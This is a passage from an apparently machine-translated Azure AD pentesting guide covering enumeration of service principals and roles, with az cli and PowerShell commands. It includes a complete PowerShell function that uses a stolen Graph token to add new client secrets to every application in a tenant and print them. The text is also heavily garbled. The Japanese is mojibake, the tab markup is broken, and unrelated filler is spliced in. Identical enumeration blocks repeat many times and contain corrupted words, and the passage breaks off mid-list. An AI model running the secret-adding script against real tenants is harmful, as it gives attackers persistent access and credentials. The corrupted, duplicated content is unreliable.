ã‚°ãƒ«ãƒ¼ãƒ—ã¯ãƒ€ã‚¤ãƒŠãƒŸãƒƒã‚¯ã«ãªã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ã¤ã¾ã‚Šã€**ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒç‰¹å®šã®æ¡ä»¶ã‚’æº€ãŸã™ã¨ã€ã‚°ãƒ«ãƒ¼ãƒ—ã«è¿½åŠ ã•ã‚Œã‚‹**ã¨ã„ã†ã“ã¨ã§ã™ã€‚ã‚‚ã¡ã‚ã‚“ã€æ¡ä»¶ãŒ**å±æ€§**ã«åŸºã¥ã„ã¦ã„ã‚‹å ´åˆã€**ãƒ¦ãƒ¼ã‚¶ãƒ¼**ãŒ**åˆ¶å¾¡**ã§ãã‚‹ã®ã§ã€ã“ã®æ©Ÿèƒ½ã‚’æ‚ªç”¨ã—ã¦**ä»–ã®ã‚°ãƒ«ãƒ¼ãƒ—ã«å…¥ã‚‹**ã“ã¨ãŒã§ãã¾ã™ã€‚\
æ¬¡ã®ãƒšãƒ¼ã‚¸ã§ãƒ€ã‚¤ãƒŠãƒŸãƒƒã‚¯ã‚°ãƒ«ãƒ¼ãƒ—ã‚’æ‚ªç”¨ã™ã‚‹æ–¹æ³•ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼š
{% endhint %}

{% content-ref url="dynamic-groups.md" %}
[dynamic-groups.md](dynamic-groups.md)
{% endcontent-ref %}

### ã‚µãƒ¼ãƒ“ã‚¹ ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ« / ã‚¨ãƒ³ã‚¿ãƒ¼ãƒ—ãƒ©ã‚¤ã‚º ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³

{% hint style="info" %}
**PowerShell** ã®ç”¨èªã§ã® **ã‚µãƒ¼ãƒ“ã‚¹ ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«** ã¯ã€Azure ãƒãƒ¼ã‚¿ãƒ«ï¼ˆWebï¼‰ã§ã¯ **ã‚¨ãƒ³ã‚¿ãƒ¼ãƒ—ãƒ©ã‚¤ã‚º ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³** ã¨å‘¼ã°ã‚Œã¦ã„ã‚‹ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚
{% endhint %}

{% tabs %}
{% tab title="az cli" %}
```bash
# Get Service Principals
az ad sp list --all
az ad sp list --all --query "[].[displayName]" -o table
# Get details of one SP
az ad sp show --id 00000000-0000-0000-0000-000000000000
# Search SP by string
az ad sp list --all --query "[?contains(displayName,'app')].displayName"
# Get owner of service principal
az ad sp owner list --id <id> --query "[].[displayName]" -o table
# Get service principals owned by the current user
az ad sp list --show-mine
# List apps that have password credentials
az ad sp list --all --query "[?passwordCredentials != null].displayName"
# List apps that have key credentials (use of certificate authentication)
az ad sp list -all --query "[?keyCredentials != null].displayName"
```
{% endtab %}

{% tab title="Azure AD" %}

## Azure AD Enumeration

### User Enumeration

User enumeration can be performed through the Azure AD login interface. By entering a valid username and observing the response, an attacker can determine if the username is valid or not. This can be automated using tools like `enum4linux`, `ldapsearch`, or custom scripts.

### Group Enumeration

Group enumeration involves identifying Azure AD groups and their members. This can be done through the Azure portal or programmatically using the Microsoft Graph API. Understanding group memberships can help attackers identify high-privileged users or potential lateral movement paths.

### Application Enumeration

Application enumeration focuses on identifying Azure AD applications and their configurations. Attackers can look for misconfigured applications that may allow unauthorized access or abuse of permissions. This can be done through the Azure portal or API queries.

### Device Enumeration

Device enumeration involves identifying devices registered in Azure AD. Attackers can look for insecurely registered devices that may pose a security risk. This can be done through the Azure portal or API queries to gather information about devices and their configurations.

### Service Principal Enumeration

Service principals represent applications or services in Azure AD and are used for authentication and authorization. Attackers can enumerate service principals to discover potentially sensitive applications or misconfigurations that could be exploited. This can be done through the Azure portal or API queries.

### Role Enumeration

Role enumeration involves identifying roles assigned to users or applications in Azure AD. Understanding assigned roles can help attackers determine the level of access users or applications have within the Azure environment. This can be done through the Azure portal or API queries to identify role assignments.

{% endtab %}
```powershell
# Get Service Principals
Get-AzureADServicePrincipal -All $true
# Get details about a SP
Get-AzureADServicePrincipal -ObjectId <id> | fl *
# Get SP by string name or Id
Get-AzureADServicePrincipal -All $true | ?{$_.DisplayName -match "app"} | fl
Get-AzureADServicePrincipal -All $true | ?{$_.AppId -match "103947652-1234-5834-103846517389"}
# Get owner of SP
Get-AzureADServicePrincipal -ObjectId <id> | Get-AzureADServicePrincipalOwner |fl *
# Get objects owned by a SP
Get-AzureADServicePrincipal -ObjectId <id> | Get-AzureADServicePrincipalOwnedObject
# Get objects created by a SP
Get-AzureADServicePrincipal -ObjectId <id> | Get-AzureADServicePrincipalCreatedObject
# Get groups where the SP is a member
Get-AzureADServicePrincipal | Get-AzureADServicePrincipalMembership
Get-AzureADServicePrincipal -ObjectId <id> | Get-AzureADServicePrincipalMembership |fl *
```
{% endtab %}

{% tab title="Az PowerShell" %}  
Azure AD ã¸ã®æ¥ç¶šã«ã¯ã€`Connect-AzAccount` ã‚³ãƒãƒ³ãƒ‰ãƒ¬ãƒƒãƒˆã‚’ä½¿ç”¨ã—ã¾ã™ã€‚ã“ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã¨ã€Web ãƒšãƒ¼ã‚¸ãŒé–‹ãã€Azure ãƒãƒ¼ã‚¿ãƒ«ã«ã‚µã‚¤ãƒ³ã‚¤ãƒ³ã™ã‚‹ã‚ˆã†æ±‚ã‚ã‚‰ã‚Œã¾ã™ã€‚ã‚µã‚¤ãƒ³ã‚¤ãƒ³å¾Œã€PowerShell ãŒ Azure AD ã«æ¥ç¶šã•ã‚Œã¾ã™ã€‚  
{% endtab %}
```powershell
# Get SPs
Get-AzADServicePrincipal
# Get info of 1 SP
Get-AzADServicePrincipal -ObjectId <id>
# Search SP by string
Get-AzADServicePrincipal | ?{$_.DisplayName -match "app"}
# Get roles of a SP
Get-AzRoleAssignment -ServicePrincipalName <String>
```
{% endtab %}

{% tab title="Raw" %}ä»¥ä¸‹ã¯ã€Azure AD ãƒšãƒ¼ã‚¸ã®ä¸€éƒ¨ã§ã™ã€‚

## ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ ãƒãƒªã‚·ãƒ¼

- ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®æœ€å°é•·ã‚’è¨­å®šã—ã¾ã™ã€‚
- ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®æœ‰åŠ¹æœŸé™ã‚’è¨­å®šã—ã¾ã™ã€‚
- ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®è¤‡é›‘ã•ã‚’è¨­å®šã—ã¾ã™ã€‚
- ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®å±¥æ­´ã‚’ä¿å­˜ã—ã¾ã™ã€‚

## ãƒãƒ«ãƒãƒ•ã‚¡ã‚¯ã‚¿èªè¨¼

- ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒã‚µã‚¤ãƒ³ã‚¤ãƒ³ã™ã‚‹éš›ã«è¿½åŠ ã®ç¢ºèªã‚’æ±‚ã‚ã¾ã™ã€‚
- ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚’å‘ä¸Šã•ã›ã‚‹ãŸã‚ã«æ¨å¥¨ã•ã‚Œã¾ã™ã€‚

## ãƒ¦ãƒ¼ã‚¶ãƒ¼ ã‚¢ã‚«ã‚¦ãƒ³ãƒˆ

- ä¸è¦ãªãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’å‰Šé™¤ã—ã¾ã™ã€‚
- ç‰¹æ¨©ã®ã‚ã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’ç›£è¦–ã—ã¾ã™ã€‚
- ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®ã‚¢ã‚¯ã‚»ã‚¹è¨±å¯ã‚’æœ€å°é™ã«ã—ã¾ã™ã€‚

## ã‚µã‚¤ãƒ³ã‚¤ãƒ³ ãƒ­ã‚°

- ç•°å¸¸ãªã‚¢ã‚¯ãƒ†ã‚£ãƒ“ãƒ†ã‚£ã‚’ç›£è¦½ã—ã¾ã™ã€‚
- ã‚µã‚¤ãƒ³ã‚¤ãƒ³ã®å¤±æ•—ã‚’ç›£è¦–ã—ã¾ã™ã€‚
- ã‚µã‚¤ãƒ³ã‚¤ãƒ³ã®æˆåŠŸã‚’ç›£è¦–ã—ã¾ã™ã€‚{% endtab %}
```powershell
$Token = 'eyJ0eX..'
$URI = 'https://graph.microsoft.com/v1.0/applications'
$RequestParams = @{
Method  = 'GET'
Uri     = $URI
Headers = @{
'Authorization' = "Bearer $Token"
}
}
(Invoke-RestMethod @RequestParams).value
```
{% endtab %}
{% endtabs %}

{% hint style="warning" %}
ã‚µãƒ¼ãƒ“ã‚¹ ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«ã®æ‰€æœ‰è€…ã¯ã€ãã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å¤‰æ›´ã§ãã¾ã™ã€‚
{% endhint %}

<details>

<summary>å„ã‚¨ãƒ³ã‚¿ãƒ¼ãƒ—ãƒ©ã‚¤ã‚º ã‚¢ãƒ—ãƒªã«ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆ ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’ãƒªã‚¹ãƒˆã—ã¦è¿½åŠ ã—ã¦ã¿ã¦ãã ã•ã„</summary>
```powershell
# Just call Add-AzADAppSecret
Function Add-AzADAppSecret
{
<#
.SYNOPSIS
Add client secret to the applications.

.PARAMETER GraphToken
Pass the Graph API Token

.EXAMPLE
PS C:\> Add-AzADAppSecret -GraphToken 'eyJ0eX..'

.LINK
https://docs.microsoft.com/en-us/graph/api/application-list?view=graph-rest-1.0&tabs=http
https://docs.microsoft.com/en-us/graph/api/application-addpassword?view=graph-rest-1.0&tabs=http
#>

[CmdletBinding()]
param(
[Parameter(Mandatory=$True)]
[String]
$GraphToken = $null
)

$AppList = $null
$AppPassword = $null

# List All the Applications

$Params = @{
"URI"     = "https://graph.microsoft.com/v1.0/applications"
"Method"  = "GET"
"Headers" = @{
"Content-Type"  = "application/json"
"Authorization" = "Bearer $GraphToken"
}
}

try
{
$AppList = Invoke-RestMethod @Params -UseBasicParsing
}
catch
{
}

# Add Password in the Application

if($AppList -ne $null)
{
[System.Collections.ArrayList]$Details = @()

foreach($App in $AppList.value)
{
$ID = $App.ID
$psobj = New-Object PSObject

$Params = @{
"URI"     = "https://graph.microsoft.com/v1.0/applications/$ID/addPassword"
"Method"  = "POST"
"Headers" = @{
"Content-Type"  = "application/json"
"Authorization" = "Bearer $GraphToken"
}
}

$Body = @{
"passwordCredential"= @{
"displayName" = "Password"
}
}

try
{
$AppPassword = Invoke-RestMethod @Params -UseBasicParsing -Body ($Body | ConvertTo-Json)
Add-Member -InputObject $psobj -NotePropertyName "Object ID" -NotePropertyValue $ID
Add-Member -InputObject $psobj -NotePropertyName "App ID" -NotePropertyValue $App.appId
Add-Member -InputObject $psobj -NotePropertyName "App Name" -NotePropertyValue $App.displayName
Add-Member -InputObject $psobj -NotePropertyName "Key ID" -NotePropertyValue $AppPassword.keyId
Add-Member -InputObject $psobj -NotePropertyName "Secret" -NotePropertyValue $AppPassword.secretText
$Details.Add($psobj) | Out-Null
}
catch
{
Write-Output "Failed to add new client secret to '$($App.displayName)' Application."
}
}
if($Details -ne $null)
{
Write-Output ""
Write-Output "Client secret added to : "
Write-Output $Details | fl *
}
}
else
{
Write-Output "Failed to Enumerate the Applications."
}
}
```
</details>

### ãƒ­ãƒ¼ãƒ«

{% tabs %}
{% tab title="az cli" %}
```bash
# Get roles
az role definition list
# Get assigned roles
az role assignment list --all --query "[].roleDefinitionName"
az role assignment list --all | jq '.[] | .roleDefinitionName,.scope'
# Get info of 1 role
az role definition list --name "AzureML Registry User"
# Get only custom roles
az role definition list --custom-role-only
# Get only roles assigned to the resource group indicated
az role definition list --resource-group <resource_group>
# Get only roles assigned to the indicated scope
az role definition list --scope <scope>
# Get all the principals a role is assigned to
az role assignment list --all --query "[].{principalName:principalName,principalType:principalType,resourceGroup:resourceGroup,roleDefinitionName:roleDefinitionName}[?roleDefinitionName=='<ROLE_NAME>']"
```
{% endtab %}

{% tab title="Azure AD" %}

Azure ADã¸ã®ä¾µå…¥ã¯ã€å¤šãã®å ´åˆã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®èªè¨¼æƒ…å ±ã‚’ç›—ã‚€ã“ã¨ã‹ã‚‰å§‹ã¾ã‚Šã¾ã™ã€‚ã“ã‚Œã¯ã€ãƒ•ã‚£ãƒƒã‚·ãƒ³ã‚°æ”»æ’ƒã€ã‚½ãƒ¼ã‚·ãƒ£ãƒ«ã‚¨ãƒ³ã‚¸ãƒ‹ã‚¢ãƒªãƒ³ã‚°ã€ã¾ãŸã¯æ—¢çŸ¥ã®è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨ã«ã‚ˆã£ã¦é”æˆã•ã‚Œã‚‹ã“ã¨ãŒã‚ˆãã‚ã‚Šã¾ã™ã€‚æˆåŠŸã—ãŸå ´åˆã€æ”»æ’ƒè€…ã¯Azure ADå†…ã®æ©Ÿå¯†ãƒ‡ãƒ¼ã‚¿ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚
```powershell
# Get all available role templates
Get-AzureADDirectoryroleTemplate
# Get enabled roles (Assigned roles)
Get-AzureADDirectoryRole
Get-AzureADDirectoryRole -ObjectId <roleID> #Get info about the role
# Get custom roles - use AzureAdPreview
Get-AzureADMSRoleDefinition | ?{$_.IsBuiltin -eq $False} | select DisplayName
# Users assigned a role (Global Administrator)
Get-AzureADDirectoryRole -Filter "DisplayName eq 'Global Administrator'" | Get-AzureADDirectoryRoleMember
Get-AzureADDirectoryRole -ObjectId <id> | fl
# Roles of the Administrative Unit (who has permissions over the administrative unit and its members)
Get-AzureADMSScopedRoleMembership -Id <id> | fl *
```
{% endtab %}

{% tab title="Az PowerShell" %}  

Azure AD ã¸ã®æ¥ç¶šã«ã¯ã€`Connect-AzAccount` ã‚³ãƒãƒ³ãƒ‰ãƒ¬ãƒƒãƒˆã‚’ä½¿ç”¨ã—ã¾ã™ã€‚æ¬¡ã®ä¾‹ã¯ã€Azure AD ã«æ¥ç¶šã™ã‚‹æ–¹æ³•ã‚’ç¤ºã—ã¦ã„ã¾ã™ã€‚

```powershell
Connect-AzAccount
```  
{% endtab %}
```powershell
# Get role assignments on the subscription
Get-AzRoleDefinition
# Get Role definition
Get-AzRoleDefinition -Name "Virtual Machine Command Executor"
# Get roles of a user or resource
Get-AzRoleAssignment -SignInName test@corp.onmicrosoft.com
Get-AzRoleAssignment -Scope /subscriptions/<subscription-id>/resourceGroups/<res_group_name>/providers/Microsoft.Compute/virtualMachines/<vm_name>
```
{% endtab %}

{% tab title="Raw" %}

## Azure AD Enumeration

### User Enumeration

- **Description**: Azure AD user enumeration can be performed using the Graph API. This can help identify valid usernames for further attacks.
- **Detection**: Monitor for excessive requests to the Graph API `/users` endpoint.
- **Recommendation**: Implement rate limiting on requests to the Graph API to prevent enumeration.

### Group Enumeration

- **Description**: Azure AD group enumeration can be performed using the Graph API. Understanding group memberships can help in lateral movement.
- **Detection**: Monitor for unusual or unauthorized requests to the Graph API `/groups` endpoint.
- **Recommendation**: Regularly review and update group memberships to minimize the risk of unauthorized access.

### Application Enumeration

- **Description**: Azure AD application enumeration can reveal information about registered applications and their configurations.
- **Detection**: Monitor for requests to the Graph API `/applications` endpoint that may indicate reconnaissance activities.
- **Recommendation**: Regularly review and audit registered applications to ensure they are still needed and properly configured.

### Device Enumeration

- **Description**: Azure AD device enumeration can provide insights into registered devices and their attributes.
- **Detection**: Monitor for suspicious requests to the Graph API `/devices` endpoint that may indicate unauthorized device reconnaissance.
- **Recommendation**: Enforce device registration controls and regularly review registered devices for compliance.

### Service Principal Enumeration

- **Description**: Azure AD service principal enumeration can help identify service principals and their permissions within the directory.
- **Detection**: Monitor for requests to the Graph API `/servicePrincipals` endpoint that may indicate reconnaissance or privilege escalation attempts.
- **Recommendation**: Regularly review and update service principal permissions to adhere to the principle of least privilege.

### OAuth Application Enumeration

- **Description**: Azure AD OAuth application enumeration can provide insights into OAuth applications registered in the directory.
- **Detection**: Monitor for requests to the Graph API `/oauth2PermissionGrants` endpoint that may indicate unauthorized OAuth application activities.
- **Recommendjson**: Regularly review and audit OAuth applications to ensure they comply with security policies and standards.

### Risky Sign-Ins Enumeration

- **Description**: Azure AD risky sign-ins enumeration can help identify sign-in attempts that are considered risky based on Azure AD Identity Protection policies.
- **Detection**: Monitor for risky sign-in events and investigate further to determine the nature of the risk.
- **Recommendation**: Configure Azure AD Identity Protection policies to enforce multi-factor authentication and other security measures for risky sign-ins.

### Directory Role Enumeration

- **Description**: Azure AD directory role enumeration can reveal information about directory roles assigned to users.
- **Detection**: Monitor for changes to directory role assignments that may indicate unauthorized privilege escalation.
- **Recommendation**: Regularly review and update directory role assignments to ensure adherence to the principle of least privilege.

### Domain Enumeration

- **Description**: Azure AD domain enumeration can provide information about verified domains in the directory.
- **Detection**: Monitor for unauthorized attempts to add or verify domains in Azure AD.
- **Recommendation**: Implement controls to prevent unauthorized domain additions and regularly review verified domains for accuracy.

### Policy Enumeration

- **Description**: Azure AD policy enumeration can reveal information about configured policies in the directory.
- **Detection**: Monitor for changes to policies that may indicate unauthorized modifications.
- **Recommendation**: Regularly review and update policies to align with security requirements and best practices.

### Credential Enumeration

- **Description**: Azure AD credential enumeration can help identify leaked or weak credentials within the directory.
- **Detection**: Monitor for suspicious authentication events that may indicate credential abuse.
- **Recommendation**: Enforce strong password policies, implement multi-factor authentication, and regularly audit credentials for security weaknesses.

### Security Defaults Enumeration

- **Description**: Azure AD security defaults enumeration can provide insights into the security settings enabled by default in the directory.
- **Detection**: Monitor for changes to security defaults configurations that may weaken the overall security posture.
- **Recommendation**: Review and customize security defaults settings to align with organizational security requirements.

### Sign-In Logs Enumeration

- **Description**: Azure AD sign-in logs enumeration can help track and analyze sign-in activities in the directory.
- **Detection**: Monitor for suspicious sign-in events that may indicate unauthorized access.
- **Recommendation**: Regularly review sign-in logs for anomalies and investigate any suspicious activities promptly.

### Conditional Access Enumeration

- **Description**: Azure AD conditional access enumeration can reveal information about configured conditional access policies.
-json**Detection**: Monitor for changes to conditional access policies that may indicate unauthorized access attempts.
- **Recommendation**: Regularly review and update conditional access policies to enforce access controls and security measures effectively.

### Identity Protection Enumeration

- **Description**: Azure AD Identity Protection enumeration can provide insights into risk detections and vulnerabilities identified by Azure AD Identity Protection.
- **Detection**: Monitor for risk detections and vulnerabilities identified by Azure AD Identity Protection that may require immediate action.
- **Recommendation**: Respond promptly to risk detections and vulnerabilities identified by Azure AD Identity Protection to mitigate potential security risks.

### B2B Guest Enumeration

- **Description**: Azure AD B2B guest enumeration can help identify external users invited to the directory as guests.
- **Detection**: Monitor for unusual guest activities that may indicate unauthorized access or misuse.
- **Recommendation**: Regularly review and manage B2B guest access to prevent unauthorized access and data leakage.

### Legacy Authentication Enumeration

- **Description**: Azure AD legacy authentication enumeration can help identify authentication attempts using legacy protocols.
- **Detection**: Monitor for legacy authentication events that may pose security risks due to outdated authentication mechanisms.
- **Recommendation**: Disable legacy authentication protocols and encourage the use of modern authentication methods to enhance security.

### Risky Users Enumeration

- **Description**: Azure AD risky users enumeration can help identify users with risky behavior or compromised credentials.
- **Detection**: Monitor for risky user activities and investigate further to determine the extent of the risk.
- **Recommendation**: Take immediate action to secure accounts of risky users and enforce additional security measures as needed.

### Security Defaults Enumeration

- **Description**: Azure AD security defaults enumeration can provide insights into the security settings enabled by default in the directory.
- **Detection**: Monitor for changes to security defaults configurations that may weaken the overall security posture.
- **Recommendation**: Review and customize security defaults settings to align with organizational security requirements.

### Sign-In Logs Enumeration

- **Description**: Azure AD sign-in logs enumeration can help track and analyze sign-in activities in the directory.
- **Detection**: Monitor for suspicious sign-in events that may indicate unauthorized access.
- **Recommendation**: Regularly review sign-in logs for anomalies and investigate any suspicious activities promptly.

### Conditional Access Enumeration

- **Description**: Azure AD conditional access enumeration can reveal information about configured conditional access policies.
- **Detection**: Monitor for changes to conditional access policies that may indicate unauthorized access attempts.
- **Recommendation**: Regularly review and update conditional access policies to enforce access controls and security measures effectively.

### Identity Protection Enumeration

- **Description**: Azure AD Identity Protection enumeration can provide insights into risk detections and vulnerabilities identified by Azure AD Identity Protection.
- **Detection**: Monitor for risk detections and vulnerabilities identified by Azure AD Identity Protection that may require immediate action.
- **Recommendation**: Respond promptly to risk detections and vulnerabilities identified by Azure AD Identity Protection to mitigate potential security risks.

### B2B Guest Enumeration

- **Description**: Azure AD B2B guest enumeration can help identify external users invited to the directory as guests.
- **Detection**: Monitor for unusual guest activities that may indicate unauthorized access or misuse.
- **Recommendation**: Regularly review and manage B2B guest access to prevent unauthorized access and data leakage.

### Legacy Authentication Enumeration

- **Description**: Azure AD legacy authentication enumeration can help identify authentication attempts using legacy protocols.
- **Detection**: Monitor for legacy authentication events that may pose security risks due to outdated authentication mechanisms.
- **Recommendation**: Disable legacy authentication protocols and encourage the use of modern authentication methods to enhance security.

### Risky Users Enumeration

- **Description**: Azure AD risky users enumeration can help identify users with risky behavior or compromised credentials.
- **Detection**: Monitor for risky user activities and investigate further to determine the extent of the risk.
- **Recommendation**: Take immediate action to secure accounts of risky users and enforce additional security measures as needed.

### Risky Users Enumeration

- **Description**: Azure AD risky users enumeration can help identify users with risky behavior or compromised credentials.
- **Detection**: Monitor for risky user activities and investigate further to determine the extent of the risk.
- **Recommendation**: Take immediate action to secure accounts of risky users and enforce additional security measures as needed.

### Security Defaults Enumeration

- **Description**: Azure AD security defaults enumeration can provide insights into the security settings enabled by default in the directory.
- **Detection**: Monitor for changes to security defaults configurations that may weaken the overall security posture.
- **Recommendation**: Review and customize security defaults settings to align with organizational security requirements.

### Sign-In Logs Enumeration

- **Description**: Azure AD sign-in logs enumeration can help track and analyze sign-in activities in the directory.
- **Detection**: Monitor for suspicious sign-in events that may indicate unauthorized access.
- **Recommendation**: Regularly review sign-in logs for anomalies and investigate any suspicious activities promptly.

### Conditional Access Enumeration

- **Description**: Azure AD conditional access enumeration can reveal information about configured conditional access policies.
- **Detection**: Monitor for changes to conditional access policies that may indicate unauthorized access attempts.
- **Recommendation**: Regularly review and update conditional access policies to enforce access controls and security measures effectively.

### Identity Protection Enumeration

- **Description**: Azure AD Identity Protection enumeration can provide insights into risk detections and vulnerabilities identified by Azure AD Identity Protection.
- **Detection**: Monitor for risk detections and vulnerabilities identified by Azure AD Identity Protection that may require immediate action.
- **Recommendation**: Respond promptly to risk detections and vulnerabilities identified by Azure AD Identity Protection to mitigate potential security risks.

### B2B Guest Enumeration

- **Description**: Azure AD B2B guest enumeration can help identify external users invited to the directory as guests.
- **Detection**: Monitor for unusual guest activities that may indicate unauthorized access or misuse.
- **Recommendation**: Regularly review and manage B2B guest access to prevent unauthorized access and data leakage.

### Legacy Authentication Enumeration

- **Description**: Azure AD legacy authentication enumeration can help identify authentication attempts using legacy protocols.
- **Detection**: Monitor for legacy authentication events that may pose security risks due to outdated authentication mechanisms.
- **Recommendation**: Disable legacy authentication protocols and encourage the use of modern authentication methods to enhance security.

### Risky Users Enumeration

- **Description**: Azure AD risky users enumeration can help identify users with risky behavior or compromised credentials.
- **Detection**: Monitor for risky user activities and investigate further to determine the extent of the risk.
- **Recommendation**: Take immediate action to secure accounts of risky users and enforce additional security measures as needed.

### Security Defaults Enumeration

- **Description**: Azure AD security defaults enumeration can provide insights into the security settings enabled by default in the directory.
- **Detection**: Monitor for changes to security defaults configurations that may weaken the overall security posture.
- **Recommendation**: Review and customize security defaults settings to align with organizational security requirements.

### Sign-In Logs Enumeration

- **Description**: Azure AD sign-in logs enumeration can help track and analyze sign-in activities in the directory.
- **Detection**: Monitor for suspicious sign-in events that may indicate unauthorized access.
- **Recommendation**: Regularly review sign-in logs for anomalies and investigate any suspicious activities promptly.

### Conditional Access Enumeration

- **Description**: Azure AD conditional access enumeration can reveal information about configured conditional access policies.
- **Detection**: Monitor for changes to conditional access policies that may indicate unauthorized access attempts.
- **Recommendation**: Regularly review and update conditional access policies to enforce access controls and security measures effectively.

### Identity Protection Enumeration

- **Description**: Azure AD Identity Protection enumeration can provide insights into risk detections and vulnerabilities identified by Azure AD Identity Protection.
- **Detection**: Monitor for risk detections and vulnerabilities identified by Azure AD Identity Protection that may require immediate action.
- **Recommendation**: Respond promptly to risk detections and vulnerabilities identified by Azure AD Identity Protection to mitigate potential security risks.

### B2B Guest Enumeration

- **Description**: Azure AD B2B guest enumeration can help identify external users invited to the directory as guests.
- **Detection**: Monitor for unusual guest activities that may indicate unauthorized access or misuse.
- **Recommendation**: Regularly review and manage B2B guest access to prevent unauthorized access and data leakage.

### Legacy Authentication Enumeration

- **Description**: Azure AD legacy authentication enumeration can help identify authentication attempts using legacy protocols.
- **Detection**: Monitor for legacy authentication events that may pose security risks due to outdated authentication mechanisms.
- **Recommendation**: Disable legacy authentication protocols and encourage the use of modern authentication methods to enhance security.

### Risky Users Enumeration

- **Description**: Azure AD risky users enumeration can help identify users with risky behavior or compromised credentials.
- **Detection**: Monitor for risky user activities and investigate further to determine the extent of the risk.
- **Recommendation**: Take immediate action to secure accounts of risky users and enforce additional security measures as needed.

### Security Defaults Enumeration

- **Description**: Azure AD security defaults enumeration can provide insights into the security settings enabled by default in the directory.
- **Detection**: Monitor for changes to security defaults configurations that may weaken the overall security posture.
- **Recommendation**: Review and customize security defaults settings to align with organizational security requirements.

### Sign-In Logs Enumeration

- **Description**: Azure AD sign-in logs enumeration can help track and analyze sign-in activities in the directory.
- **Detection**: Monitor for suspicious sign-in events that may indicate unauthorized access.
- **Recommendation**: Regularly review sign-in logs for anomalies and investigate any suspicious activities promptly.

### Conditional Access Enumeration

- **Description**: Azure AD conditional access enumeration can reveal information about configured conditional access policies.
- **Detection**: Monitor for changes to conditional access policies that may indicate unauthorized access attempts.
- **Recommendation**: Regularly review and update conditional access policies to enforce access controls and security measures effectively.

### Identity Protection Enumeration

- **Description**: Azure AD Identity Protection enumeration can provide insights into risk detections and vulnerabilities identified by Azure AD Identity Protection.
- **Detection**: Monitor for risk detections and vulnerabilities identified by Azure AD Identity Protection that may require immediate action.
- **Recommendation**: Respond promptly to risk detections and vulnerabilities identified by Azure AD Identity Protection to mitigate potential security risks.

### B2B Guest Enumeration

- **Description**: Azure AD B2B guest enumeration can help identify external users invited to the directory as guests.
- **Detection**: Monitor for unusual guest activities that may indicate unauthorized access or misuse.
- **Recommendation**: Regularly review and manage B2B guest access to prevent unauthorized access and data leakage.

### Legacy Authentication Enumeration

- **Description**: Azure AD legacy authentication enumeration can help identify authentication attempts using legacy protocols.
- **Detection**: Monitor for legacy authentication events that may pose security risks due to outdated authentication mechanisms.
- **Recommendation**: Disable legacy authentication protocols and encourage the use of modern authentication methods to enhance security.

### Risky Users Enumeration

- **Description**: Azure AD risky users enumeration can help identify users with risky behavior or compromised credentials.
- **Detection**: Monitor for risky user activities and investigate further to determine the extent of the risk.
- **Recommendation**: Take immediate action to secure accounts of risky users and enforce additional security measures as needed.

### Security Defaults Enumeration

- **Description**: Azure AD security defaults enumeration can provide insights into the security settings enabled by default in the directory.
- **Detection**: Monitor for changes to security defaults configurations that may weaken the overall security posture.
- **Recommendation**: Review and customize security defaults settings to align with organizational security requirements.

### Sign-In Logs Enumeration

- **Description**: Azure AD sign-in logs enumeration can help track and analyze sign-in activities in the directory.
- **Detection**: Monitor for suspicious sign-in events that may indicate unauthorized access.
- **Recommendation**: Regularly review sign-in logs for anomalies and investigate any suspicious activities promptly.

### Conditional Access Enumeration

- **Description**: Azure AD conditional access enumeration can reveal information about configured conditional access policies.
- **Detection**: Monitor for changes to conditional access policies that may indicate unauthorized access attempts.
- **Recommendation**: Regularly review and update conditional access policies to enforce access controls and security measures effectively.

### Identity Protection Enumeration

- **Description**: Azure AD Identity Protection enumeration can provide insights into risk detections and vulnerabilities identified by Azure AD Identity Protection.
- **Detection**: Monitor for risk detections and vulnerabilities identified by Azure AD Identity Protection that may require immediate action.
- **Recommendation**: Respond promptly to risk detections and vulnerabilities identified by Azure AD Identity Protection to mitigate potential security risks.

### B2B Guest Enumeration

- **Description**: Azure AD B2B guest enumeration can help identify external users invited to the directory as guests.
- **Detection**: Monitor for unusual guest activities that may indicate unauthorized access or misuse.
- **Recommendation**: Regularly review and manage B2B guest access to prevent unauthorized access and data leakage.

### Legacy Authentication Enumeration

- **Description**: Azure AD legacy authentication enumeration can help identify authentication attempts using legacy protocols.
- **Detection**: Monitor for legacy authentication events that may pose security risks due to outdated authentication mechanisms.
- **Recommendation**: Disable legacy authentication protocols and encourage the use of modern authentication methods to enhance security.

### Risky Users Enumeration

- **Description**: Azure AD risky users enumeration can help identify users with risky behavior or compromised credentials.
- **Detection**: Monitor for risky user activities and investigate further to determine the extent of the risk.
- **Recommendation**: Take immediate action to secure accounts of risky users and enforce additional security measures as needed.

### Security Defaults Enumeration

- **Description**: Azure AD security defaults enumeration can provide insights into the security settings enabled by default in the directory.
- **Detection**: Monitor for changes to security defaults configurations that may weaken the overall security posture.
